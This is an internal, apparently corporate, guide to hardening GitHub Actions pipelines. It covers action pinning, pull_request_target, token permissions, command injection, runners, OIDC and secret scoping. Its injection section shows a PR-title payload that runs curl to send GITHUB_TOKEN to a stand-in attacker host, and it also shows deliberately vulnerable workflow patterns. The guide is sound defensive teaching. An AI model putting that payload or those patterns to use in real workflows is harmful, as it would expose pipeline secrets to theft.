<!-- ⚠️ MANAGED BY @sanofi-accelerator/ai-standards — DO NOT EDIT -->
<!-- Local changes will be overwritten on next `ai-standards sync` -->

# GitHub Actions Security Hardening

Deep-dive into GitHub Actions security risks, attack vectors, and mitigations
relevant to Sanofi CI/CD pipelines.

## Table of Contents

- [1. Supply Chain Attacks via Compromised Actions](#1-supply-chain-attacks-via-compromised-actions)
- [2. Secrets Extraction via `pull_request_target`](#2-secrets-extraction-via-pull_request_target)
- [3. GITHUB_TOKEN Permission Escalation](#3-github_token-permission-escalation)
- [4. Workflow Injection via Untrusted Input](#4-workflow-injection-via-untrusted-input)
- [5. Self-Hosted Runner Risks](#5-self-hosted-runner-risks)
- [6. OIDC for AWS: Role-Per-Environment Pattern](#6-oidc-for-aws-role-per-environment-pattern)
- [7. JFrog Credentials via .terraformrc](#7-jfrog-credentials-via-terraformrc)
- [8. Environment-Scoped Secrets vs `secrets: inherit`](#8-environment-scoped-secrets-vs-secrets-inherit)
- [9. `continue-on-error: true` Risks on Security Steps](#9-continue-on-error-true-risks-on-security-steps)
- [10. OpenSSF Scorecard Checks](#10-openssf-scorecard-checks)

---

## 1. Supply Chain Attacks via Compromised Actions

**Risk**: A third-party action is compromised (maintainer account takeover, malicious
update). If you reference it by mutable tag (`@v4`), the next run uses the compromised
code with full access to your secrets and GITHUB_TOKEN.

**Attack scenario:**

```yaml
# Vulnerable: tag @v2 can be moved to point at malicious commit
- uses: popular-org/useful-action@v2
```

An attacker compromises the action maintainer's account, rewrites the `v2` tag to
point at a malicious commit that exfiltrates `GITHUB_TOKEN` and environment secrets.

**Mitigation: SHA pinning (within the limits of the allowlist)**

```yaml
# Safe: immutable reference to a specific commit
- uses: popular-org/useful-action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2 # v2.3.1
```

**Sanofi allowlist constraint.** Sanofi's GitHub Actions allowlist governs which
actions can run at all. GitHub-published actions (`actions/*`) and actions from
verified creators are allowed broadly and SHOULD be SHA-pinned as above. Other
third-party actions are listed individually, and the allowlist entries are
tag-based, not SHA-based — so pinning a non-listed action to a commit SHA will
still be rejected at runtime. For those actions, use the exact reference
registered in the allowlist (typically a tag such as `@v2`), and ask the platform
team to update the allowlist if you need a new action or a newer version.

**Exception — org-managed reusable workflows:** Sanofi org-level reusable workflows
(e.g., CodeGuard `cyber-AST-Action_reusable`, Tyr `tsg-tyr`) may be referenced with
`@main` instead of a pinned SHA. These workflows are centrally maintained by the
security/platform team within the Sanofi GitHub org, so they are not subject to
third-party supply-chain risk. The owning team controls the `main` branch and reviews
all changes before merge. When using `@main` for org workflows, always add a comment
explaining the exception.

**Additional mitigations:**

- Keep the action allowlist as the authoritative gate on what runs
- Use Dependabot or Renovate to propose SHA updates for allowlisted GitHub /
  verified-creator actions (review required)
- Prefer GitHub-owned actions (`actions/*`) which have higher trust
- Review action source code before requesting allowlist addition
- Use `CODEOWNERS` to require review for `.github/workflows/` changes

**Finding the SHA for an action tag:**

```bash
gh api repos/{owner}/{repo}/git/ref/tags/{tag} --jq '.object.sha'
```

---

## 2. Secrets Extraction via `pull_request_target`

**Risk**: `pull_request_target` runs in the context of the base branch (with access
to secrets), but can be triggered by an external contributor's fork PR. If the workflow
checks out the PR's head code and executes it, the attacker's code runs with your secrets.

**Dangerous pattern:**

```yaml
on:
  pull_request_target:

jobs:
  build:
    runs-on: atmos-aws-arc-runner-set
    steps:
      # DANGEROUS: checks out attacker-controlled code
      - uses: actions/checkout@SHA
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      # Attacker's code now runs with access to secrets
      - run: npm ci && npm test
```

**Mitigation:**

1. Avoid `pull_request_target` entirely when possible -- use `pull_request` instead
2. If you must use it, NEVER checkout the PR head code
3. If you need the PR code, use a two-workflow pattern:
   - First workflow (`pull_request`): build and test (no secrets needed)
   - Second workflow (`workflow_run`): post results using secrets

**Safe alternative:**

```yaml
on:
  pull_request: # Runs in fork context, no secrets access

jobs:
  build:
    runs-on: atmos-aws-arc-runner-set
    steps:
      - uses: actions/checkout@SHA # v4.1.1
      - run: npm ci && npm test
```

---

## 3. GITHUB_TOKEN Permission Escalation

**Risk**: By default, `GITHUB_TOKEN` may have broad write permissions (depending on
org settings). Workflows that don't restrict permissions can be exploited to modify
repo contents, approve PRs, or push to protected branches.

**Vulnerable (no permissions block):**

```yaml
name: CI
on: push
# No permissions block -- inherits org default (may be write-all)
jobs:
  build:
    runs-on: atmos-aws-arc-runner-set
    steps:
      - uses: actions/checkout@SHA
      - run: npm test
```

**Mitigation: Explicit least-privilege permissions**

```yaml
name: CI
on: push

permissions:
  contents: read # Only what's needed

jobs:
  build:
    runs-on: atmos-aws-arc-runner-set
    steps:
      - uses: actions/checkout@SHA
      - run: npm test
```

**Permission escalation patterns to watch for:**

- `permissions: write-all` -- grants everything
- Missing `permissions` block -- relies on org defaults
- `contents: write` on jobs that only need read
- `pull-requests: write` on CI-only workflows
- Reusable workflow callers inheriting parent permissions without narrowing

**Org-level defense:** Set default GITHUB_TOKEN permissions to `read` in org settings.

---

## 4. Workflow Injection via Untrusted Input

**Risk**: GitHub Actions expressions (`${{ }}`) in `run:` blocks are interpolated
before the shell executes. If the expression contains attacker-controlled input (PR
title, branch name, issue body), it enables command injection.

**Vulnerable:**

```yaml
- name: Echo PR title
  run: echo "Processing PR: ${{ github.event.pull_request.title }}"
  # If PR title is: "; curl attacker.com/steal?token=$GITHUB_TOKEN"
  # The shell executes: echo "Processing PR: "; curl attacker.com/steal?...
```

**Dangerous expressions (attacker-controlled):**

- `${{ github.event.pull_request.title }}`
- `${{ github.event.pull_request.body }}`
- `${{ github.event.issue.title }}`
- `${{ github.event.issue.body }}`
- `${{ github.event.comment.body }}`
- `${{ github.event.pull_request.head.ref }}` (branch name)
- `${{ github.head_ref }}`

**Mitigation: Use environment variables instead of inline expressions**

```yaml
- name: Echo PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Processing PR: $PR_TITLE"
  # Now $PR_TITLE is treated as a shell variable, not interpolated
```

**Mitigation: Use an intermediate step with output**

```yaml
- name: Sanitize input
  id: sanitize
  run: |
    SAFE_TITLE=$(echo "$PR_TITLE" | tr -cd '[:alnum:] [:space:]-_')
    echo "title=$SAFE_TITLE" >> $GITHUB_OUTPUT
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

---

## 5. Self-Hosted Runner Risks

**Risk**: Self-hosted runners persist between jobs. A malicious workflow can install
backdoors, modify tools, or steal credentials that persist for subsequent jobs.

**Key risks:**

- Credential theft from previous jobs (AWS creds, tokens in `/tmp`)
- Tool tampering (replacing `git`, `npm`, `terraform` with trojanized versions)
- Persistence via cron jobs or startup scripts
- Lateral movement to internal networks

**Mitigations:**

- Use ephemeral runners (destroy after each job) whenever possible
- Never run untrusted fork PRs on self-hosted runners
- Isolate runners in dedicated VPCs with minimal network access
- Use runner groups to restrict which repos can use which runners
- Audit runner machines regularly

At Sanofi, all jobs MUST use the managed ARC runner `atmos-aws-arc-runner-set`.
GitHub-hosted runners (`ubuntu-latest`) are not permitted. The ARC runner set provides
ephemeral, pre-hardened runners managed by the platform team.

---

## 6. OIDC for AWS: Role-Per-Environment Pattern

**Pattern**: Use GitHub's OIDC provider to assume AWS IAM roles without storing
long-lived credentials. Each environment (dev, test, prod) has its own IAM role
with a trust policy scoped to the repository and branch.

```yaml
permissions:
  id-token: write # Required for OIDC token request
  contents: read

jobs:
  deploy:
    environment: ${{ inputs.env }}
    runs-on: atmos-aws-arc-runner-set
    steps:
      - name: Configure AWS Credentials (OIDC)
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::${{ secrets.AWS_ACCOUNT_ID }}:role/App_githubrunners_accelerator_${{ inputs.env }}
          aws-region: eu-west-1
```

**IAM trust policy (per environment):**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::ACCOUNT_ID:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:Sanofi-Accelerator/my-repo:environment:prod"
        }
      }
    }
  ]
}
```

**Key points:**

- `sub` claim scoped to specific repo AND environment
- Prod role can only be assumed from the `prod` environment (which has approval gates)
- AWS account ID stored as a GitHub secret, not hardcoded
- Region typically `eu-west-1` for Sanofi EMEA workloads

---

## 7. JFrog Credentials via .terraformrc

For Terraform workflows that pull private modules from Sanofi's JFrog Artifactory:

```yaml
- name: Configure JFrog Credentials
  run: |
    cat <<EOF > ~/.terraformrc
    credentials "sanofi.jfrog.io" {
      token = "${{ secrets.JFROG_TOKEN }}"
    }
    EOF
```

**Security considerations:**

- `JFROG_TOKEN` must be stored as a GitHub Environment secret (not repo-level)
- The `.terraformrc` file is created at runtime and lives only in the runner
- Never commit `.terraformrc` to the repository
- Scope the JFrog token to read-only access for CI (write only for publish jobs)
- Rotate the token regularly

---

## 8. Environment-Scoped Secrets vs `secrets: inherit`

**`secrets: inherit`**: Passes ALL available secrets to a reusable workflow. This is
convenient but violates the principle of least privilege.

**When `secrets: inherit` is acceptable:**

- Calling org-level reusable workflows (CodeGuard, Tyr) that need specific org secrets
- The reusable workflow is owned by a trusted team within the org

**When to scope secrets explicitly:**

```yaml
# Preferred: explicit secret passing
jobs:
  deploy:
    uses: ./.github/workflows/deploy.yaml
    with:
      env: prod
    secrets:
      AWS_ACCOUNT_ID: ${{ secrets.AWS_ACCOUNT_ID }}
      # Only pass what the workflow needs
```

**Risk of `secrets: inherit`:**

- A reusable workflow update could start reading secrets it previously didn't
- Violates least-privilege secret management if environment scoping is not in place
- Makes it harder to audit which secrets are used where

---

## 9. `continue-on-error: true` Risks on Security Steps

**Risk**: Setting `continue-on-error: true` on security-related steps (SAST, audit,
vulnerability scanning) silently swallows failures. The workflow reports success even
when security checks find critical issues.

**Dangerous:**

```yaml
- name: SAST Scan
  run: npm run sast
  continue-on-error: true # Critical findings are silently ignored

- name: Dependency Audit
  run: npm audit --audit-level=high
  continue-on-error: true # High-severity vulnerabilities pass through
```

**When `continue-on-error` is acceptable:**

- Non-blocking informational steps (e.g., uploading optional metrics)
- Steps that generate warnings but not blocking findings
- NEVER on security, SAST, audit, or compliance steps

**Mitigation:**

```yaml
- name: SAST Scan
  run: npm run sast
  # No continue-on-error -- if SAST fails, the build fails
```

---

## 10. OpenSSF Scorecard Checks

The OpenSSF Scorecard assesses repository security practices. Key checks relevant
to GitHub Actions security:

| Check               | What It Verifies                                  |
| ------------------- | ------------------------------------------------- |
| Token-Permissions   | Workflow permissions are scoped                   |
| Pinned-Dependencies | Actions pinned to SHA                             |
| Dangerous-Workflow  | No `pull_request_target` with checkout of PR head |
| Branch-Protection   | Branch protection rules configured                |
| Code-Review         | PRs require review before merge                   |
| SAST                | Static analysis configured                        |
| Vulnerabilities     | Known vulnerabilities in dependencies             |

**Running Scorecard in CI:**

```yaml
- name: OSSF Scorecard
  uses: ossf/scorecard-action@dc50aa9510b46c811795eb24b2f1ba02a914e534 # v2.3.3
  with:
    results_file: results.sarif
    results_format: sarif
```

Scorecard results can be uploaded to GitHub Security tab via SARIF.
